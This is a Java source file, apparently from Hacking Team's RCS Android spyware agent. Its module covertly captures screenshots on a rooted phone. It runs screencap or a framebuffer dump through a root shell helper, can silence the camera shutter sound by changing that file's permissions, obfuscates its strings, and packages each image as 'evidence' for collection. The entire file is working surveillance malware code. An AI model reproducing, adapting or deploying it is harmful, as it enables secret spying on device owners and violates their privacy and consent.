/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SnapshotAgent.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.os.Build;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.conf.Configuration;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.listener.ListenerStandby;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.WChar;
import com.android.mm.M;

/**
 * The Class SnapshotAgent.
 * "screenshot"
 */
public class ModuleSnapshot extends BaseInstantModule {

	private static final String TAG = "ModuleSnapshot"; //$NON-NLS-1$
	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
	private static final int MIN_TIMER = 1 * 1000;
	private static final long SNAPSHOT_DELAY = 1000;

	final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
			.getDefaultDisplay();

	/** The Constant CAPTURE_FULLSCREEN. */
	final private static int CAPTURE_FULLSCREEN = 0;

	/** The Constant CAPTURE_FOREGROUND. */
	final private static int CAPTURE_FOREGROUND = 1;

	String cameraSound = M.e("/system/media/audio/ui/camera_click.ogg");

	/** The delay. */
	private int delay;

	/** The type. */
	private int type;
	private int quality;
	Semaphore working = new Semaphore(1, true);

	private boolean frameBuffer = true;
	private boolean screenCap = true;
	boolean infoScreenSent = false;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		if (!Status.self().haveRoot()) {
			return false;
		}

		try {
			String qualityParam = conf.getString("quality");
			if ("low".equals(qualityParam)) {
				quality = 50;
			} else if ("med".equals(qualityParam)) {
				quality = 70;
			} else if ("high".equals(qualityParam)) {
				quality = 90;
			}
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart): have root");
		}

		final boolean isScreenOn = ListenerStandby.isScreenOn();

		if (!isScreenOn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
			}

			return;
		}

		try {
			if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
				try {
					if (!screencapMethod()) {
						screenCap = false;
						if (!frameBufferMethod()) {
							frameBuffer = false;

						}
					}

					if (!frameBuffer && !screenCap) {
						if (!infoScreenSent) {
							EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
							infoScreenSent = true;
						}
						if (Cfg.DEBUG) {
							Check.log(TAG + " (actualStart) Screenshot not supported");
						}
					}

				} catch (final Exception ex) {
					if (Cfg.EXCEPTION) {
						Check.log(ex);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
						Check.log(ex);//$NON-NLS-1$
					}
				} finally {
					Status.self().semaphoreMediaserver.release();
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart) failed to get sem for screen snapshot");
				}
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) failed to get sem for screen snapshot INTERRUPTED");
			}
		}
	}

	private boolean screencapMethod() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (screencapMethod) ");
		}

		if (!screenCap) {
			return false;
		}
		// Questa utility chiama solo una IOCTL
		// http://forum.xda-developers.com/showpost.php?p=41461956
		String sc = M.e("/system/bin/screencap");
		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName() + M.e("/files/frame.png");

		AutoFile asc = new AutoFile(sc);
		AutoFile aframe = new AutoFile(frame);
		aframe.delete();

		if (asc.exists() && asc.canRead()) {

			try {
				ExecuteResult res = Execute.executeScript(sc + M.e(" -p ") + frame + M.e(";chmod 777 ") + frame);
				if (aframe.exists() && aframe.canRead()) {
					Bitmap bitmap = readPng(aframe);
					if (bitmap == null) {
						return false;
					}
					byte[] jpeg = toJpeg(bitmap);
					bitmap = null;

					if (jpeg == null) {
						return false;
					}

					EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);

					System.gc();
					return true;
				}

			}finally{
				aframe.delete();
			}
		}
		return false;
	}

	private void enableClick() {
		AutoFile file = new AutoFile(cameraSound);
		if (file.exists()) {
			file.chmod(M.e("777"));
		}
	}

	private void disableClick() {
		AutoFile file = new AutoFile(cameraSound);
		if (file.exists()) {
			file.chmod(M.e("000"));
		}
	}

	private Bitmap readPng(AutoFile aframe) {
		Bitmap bitmap = BitmapFactory.decodeFile(aframe.getFilename());
		return bitmap;
	}

	private boolean frameBufferMethod() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (frameBufferMethod) ");
		}

		if (!frameBuffer) {
			return false;
		}

		try {
			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();

			int width, height, w, h;
			final int orientation = display.getOrientation();

			if (isTablet()) {
				h = display.getWidth();
				w = display.getHeight();
			} else {
				w = display.getWidth();
				h = display.getHeight();
			}

			boolean useOrientation = true;
			boolean useMatrix = true;

			if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
				width = w;
				height = h;
			} else {
				height = w;
				width = h;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
			}

			Bitmap bitmap = null;
			System.gc();

			// 0: invertito blu e rosso
			// 1: perdita info
			// 2: invertito blu e verde
			// 3: no ARGB, no ABGR, no AGRB
			byte[] raw = getRawBitmap();

			if (raw == null || raw.length == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (frameBufferMethod): raw bitmap is null or has 0 length"); //$NON-NLS-1$
				}
				return false;
			} else {

				if (isBlack(raw)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (frameBufferMethod): all black");
					}
					// TODO: aggiungere (una volta sola) un log info
					return false;
				}
				if (usesInvertedColors()) {
					// sul tablet non e' ARGB ma ABGR.
					byte[] newraw = new byte[raw.length / 2];

					for (int i = 0; i < newraw.length; i++) {
						switch (i % 4) {
						case 0:
							newraw[i] = raw[i + 2]; // A 3:+2
							break;
						case 1:
							newraw[i] = raw[i]; // R 1:+2 2:+1
							break;
						case 2:
							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
							break;
						case 3:
							newraw[i] = raw[i]; // B 1:-2
							break;
						}
						/*
						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
						 * // B 1:-2
						 */
					}

					raw = newraw;
				}
				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

				ByteBuffer buffer = ByteBuffer.wrap(raw);
				if (buffer == null) {
					return false;
				}
				if(bitmap == null){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (frameBufferMethod): 1) bitmap creation failed");
					}
					return false;
				}
				bitmap.copyPixelsFromBuffer(buffer);
				buffer = null;
				raw = null;

				int rotateTab = 0;

				if (isTablet()) {
					rotateTab = -90;
				}

				if (useMatrix && orientation != Surface.ROTATION_0) {
					final Matrix matrix = new Matrix();

					if (orientation == Surface.ROTATION_90) {
						matrix.setRotate(270 + rotateTab);
					} else if (orientation == Surface.ROTATION_270) {
						matrix.setRotate(90 + rotateTab);
					} else if (orientation == Surface.ROTATION_180) {
						matrix.setRotate(180 + rotateTab);
					} else {
						matrix.setRotate(rotateTab);
					}

					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
				}
				if(bitmap == null){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (frameBufferMethod): 2) bitmap creation failed");
					}
					return false;
				}
				byte[] jpeg = toJpeg(bitmap);
				bitmap = null;

				EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
				jpeg = null;

			}
			return true;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (frameBufferMethod) Error: " + ex);
			}
			return false;
		}
	}

	private boolean isBlack(byte[] raw) {
		for (int i = 0; i < raw.length; i++) {
			if (raw[i] != 0) {
				return false;
			}
		}
		return true;
	}

	private boolean isTablet() {
		int w = display.getWidth();
		int h = display.getHeight();

		if ((w == 600 && h == 1024) || (w == 1024 && h == 600)) {
			return true;
		}

		String model = Build.MODEL.toLowerCase();

		// Samsung Galaxy Tab
		if (model.contains(M.e("gt-p7500"))) {
			return true;
		}

		return false;
	}

	private boolean usesInvertedColors() {
		String model = Build.MODEL.toLowerCase();

		// Samsung Galaxy Tab
		if (model.contains(M.e("gt-p7500"))) {
			return true;
		}

		// Samsung Galaxy S2
		if (model.contains(M.e("gt-i9100"))) {
			return true;
		}

		// Samsung Galaxy S3
		if (model.contains(M.e("gt-i9300"))) {
			return true;
		}

		return false;
	}

	private byte[] getAdditionalData() {
		final String window = M.e("Desktop"); //$NON-NLS-1$

		final int wlen = window.length() * 2;
		final int tlen = wlen + 24;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
		databuffer.writeInt(0); // process name len
		databuffer.writeInt(wlen); // windows name len

		byte[] windowsName = new byte[wlen];
		windowsName = WChar.getBytes(window);
		databuffer.write(windowsName);

		return additionalData;
	}

	private byte[] toJpeg(Bitmap bitmap) {

		ByteArrayOutputStream os = new ByteArrayOutputStream();
		bitmap.compress(Bitmap.CompressFormat.JPEG, quality, os);

		final byte[] array = os.toByteArray();
		try {
			os.close();
			os = null;

		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
		return array;

	}

	private byte[] getRawBitmap() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getRawBitmap): calling frame generator");
			}

			Execute.execute(Configuration.shellFile + M.e(" fb /data/data/")
					+ Status.self().getAppContext().getPackageName() +  M.e("/files/frame"));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
			}
			// 11_3=frame
			final AutoFile file = new AutoFile(path, M.e("frame")); //$NON-NLS-1$

			if (file.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getRawBitmap) file exists: " + file);
				}

				byte[] ret = file.read();

				file.delete();
				return ret;
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getRawBitmap) Error: " + e);
			}
		}

		return null;
	}

}
